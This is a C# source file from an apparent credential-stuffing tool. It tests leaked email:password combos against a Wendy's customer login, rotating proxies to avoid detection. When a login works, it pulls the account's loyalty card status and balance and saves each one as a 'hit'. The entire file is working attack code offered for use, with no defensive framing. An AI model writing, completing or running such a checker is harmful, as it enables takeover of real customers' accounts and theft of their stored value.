using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class Wendys
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                Guid gid1 = Guid.NewGuid();
                string gid = gid1.ToString();
                httpRequest.AddHeader("accept", "application/json");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("content-type", "application/json");
                httpRequest.AddHeader("origin", "https://my.wendys.com");
                httpRequest.AddHeader("referer", "https://my.wendys.com/");
                httpRequest.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36");
                string str1 = httpRequest.Post("URL HERE", "{\"lang\":\"en\",\"cntry\":\"US\",\"deviceId\":\"" + gid + "\",\"sourceCode\":\"MY.WENDYS\",\"version\":\"5.32.1\",\"login\":\"" + strArray1[0] + "\", \"password\":\"" + strArray1[1] + "\",\"keepSignedIn\":false}", "application/json").ToString();
                if (str1.Contains("That didn't seem to work.  If you're having trouble logging in, try resetting your password, or if that doesn't work, ") || str1.Contains("having trouble logging in, try resetting your password"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;

                }
                else if (str1.Contains("accessJwt"))
                {
                    string Card = Cryptography.LR(str1, "\"hasLoyaltyCard\":", ",").FirstOrDefault();
                    string tk = Cryptography.LR(str1, "token\":\"", "\"").FirstOrDefault();
                    httpRequest.ClearAllHeaders();
                    httpRequest.AddHeader("accept", "application/json");
                    httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                    httpRequest.AddHeader("content-type", "application/json");
                    httpRequest.AddHeader("origin", "https://my.wendys.com");
                    httpRequest.AddHeader("referer", "https://my.wendys.com/");
                    httpRequest.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36");
                    string str2 = httpRequest.Post("https://customerservices.wendys.com/CustomerServices/rest/balance/combined?lang=en&cntry=US&sourceCode=MY.WENDYS&version=5.32.1", "{\"lang\":\"en\",\"cntry\":\"US\",\"deviceId\":\"" + gid + "\",\"token\":\"" + tk + "\",\"sourceCode\":\"ORDER.WENDYS\",\"version\":\"6.5.3\"}", "application/json").ToString();
                    string Balance = Cryptography.LR(str2, "<amount>", "</amount>").FirstOrDefault();
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} | Card: {Card} | Balance: {Balance}", Color.Green);
                    }
                    Program.Save(combo + $" | Card: {Card} | Balance: {Balance}", "Wendys Hits");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
